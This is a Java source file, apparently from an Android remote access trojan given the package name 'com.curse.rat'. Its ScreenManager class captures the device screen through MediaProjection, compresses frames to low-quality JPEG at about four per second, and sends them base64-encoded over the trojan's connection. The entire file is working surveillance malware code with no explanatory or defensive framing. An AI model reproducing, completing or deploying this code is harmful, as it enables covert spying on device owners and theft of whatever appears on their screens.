package com.curse.rat;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenManager {
    private static final String TAG = "ScreenManager";
    private static MediaProjection mediaProjection;
    private static VirtualDisplay virtualDisplay;
    private static ImageReader imageReader;
    private static boolean isStreaming = false;
    private static int screenWidth, screenHeight, screenDensity;
    private static int origWidth, origHeight;

    public static void startStreaming(Context context, int resultCode, Intent data) {
        if (isStreaming) return;

        try {
            MediaProjectionManager mpManager = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mediaProjection = mpManager.getMediaProjection(resultCode, data);

            if (mediaProjection == null) {
                Log.e(TAG, "MediaProjection is null, failed to start streaming.");
                return;
            }

            isStreaming = true;

            WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(metrics);
            
            origWidth = metrics.widthPixels;
            origHeight = metrics.heightPixels;
            screenWidth = origWidth / 2; // Downscale for performance
            screenHeight = origHeight / 2;
            screenDensity = metrics.densityDpi;

            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
            virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
                    screenWidth, screenHeight, screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, null);

            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    if (!isStreaming) return;
                    
                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null) {
                            processImage(image);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Image processing error: " + e.getMessage());
                    } finally {
                        if (image != null) image.close();
                    }
                }
            }, new Handler(Looper.getMainLooper()));

            mediaProjection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    super.onStop();
                    stopStreaming();
                }
            }, new Handler(Looper.getMainLooper()));

        } catch (Exception e) {
            Log.e(TAG, "Failed to start screen streaming: " + e.getMessage());
            stopStreaming();
        }
    }

    private static long lastFrameTime = 0;
    private static void processImage(Image image) {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastFrameTime < 250) return; // ~4 FPS
        lastFrameTime = currentTime;

        try {
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * screenWidth;

            Bitmap bitmap = Bitmap.createBitmap(screenWidth + rowPadding / pixelStride, screenHeight, Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 40, baos);
            byte[] bytes = baos.toByteArray();
            String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);

            JSONObject jo = new JSONObject();
            jo.put("type", "screen_share");
            jo.put("image", base64);
            jo.put("width", origWidth);
            jo.put("height", origHeight);
            ConnectionManager.send(jo.toString());
            
            bitmap.recycle();
        } catch (Exception e) {
            Log.e(TAG, "Process Image Error: " + e.getMessage());
        }
    }

    public static void stopStreaming() {
        isStreaming = false;
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }
}
